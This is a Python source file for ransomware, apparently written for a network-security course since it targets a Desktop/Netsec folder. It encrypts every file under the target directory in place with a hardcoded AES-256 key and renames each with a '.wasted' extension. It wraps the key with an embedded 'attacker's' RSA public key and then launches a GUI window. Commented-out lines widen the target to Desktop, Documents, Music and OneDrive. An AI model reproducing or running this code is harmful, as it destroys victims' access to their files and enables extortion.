from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter
import argparse
import os
import sys
import base64
import platform 
import getpass
import socket
import base64

import discover
import modify
from gui import mainwindow

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn'  # AES 256-key used to encrypt files
SERVER_PUBLIC_RSA_KEY = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAklmKLXGK6jfMis4ifjlB
xSGMFCj1RtSA/sQxs4I5IWvMxYSD1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXT
qPYmZW+TQjtrx4tG7ZHda65+EdyVJkwp7hD2fpYJhhn99Cu0J3A+EiNdt7+EtOdP
GhYcIZmJ7iT5aRCkXiKXrw+iIL6DT0oiXNX7O7CYID8CykTf5/8Ee1hjAEv3M4re
q/CydAWrsAJPhtEmObu6cn2FYFfwGmBrUQf1BE0/4/uqCoP2EmCua6xJE1E2MZkz
vvYVc85DbQFK/Jcpeq0QkKiJ4Z+TWGnjIZqBZDaVcmaDl3CKdrvY222bp/F20LZg
HwIDAQAB
-----END PUBLIC KEY-----''' # Attacker's embedded public RSA key used to encrypt AES key

extension = ".wasted" # Ransomware custom extension

def main():
    print('[*] Ransomware\n')
    plt = platform.system()
    if plt == "Linux" or plt == "Darwin":
        startdirs = [os.environ['HOME'] + '/Desktop/Netsec']
    elif plt == "Windows":
        startdirs = [os.environ['HOME'] + '/Desktop/Netsec']
        # Can also hardcode additional directories
        # startdirs = [os.environ['USERPROFILE'] + '\\Desktop', 
        # os.environ['USERPROFILE'] + '\\Documents',
        # os.environ['USERPROFILE'] + '\\Music',
        # os.environ['USERPROFILE'] + '\\Desktop',
        # os.environ['USERPROFILE'] + '\\Onedrive']
    else:
        print("Unidentified system")
        exit(0)
     # Encrypt AES key with attacker's embedded RSA public key 
    server_key = RSA.importKey(SERVER_PUBLIC_RSA_KEY)
    encryptor = PKCS1_OAEP.new(server_key)
    encrypted_key = encryptor.encrypt(HARDCODED_KEY)
    encrypted_key_b64 = base64.b64encode(encrypted_key).decode("ascii")
   
    key = HARDCODED_KEY    

    # Create AES counter and AES cipher
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
    
    # Recursively go through folders and encrypt/decrypt files
    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            if not file.endswith(extension):
                modify.modify_file_inplace(file, crypt.encrypt)
                os.rename(file, file + extension)
                print("File changed from " + file + " to " + file + extension)
       
    main = mainwindow(encrypted_key_b64)
    main.mainloop()
if __name__=="__main__":
    main()
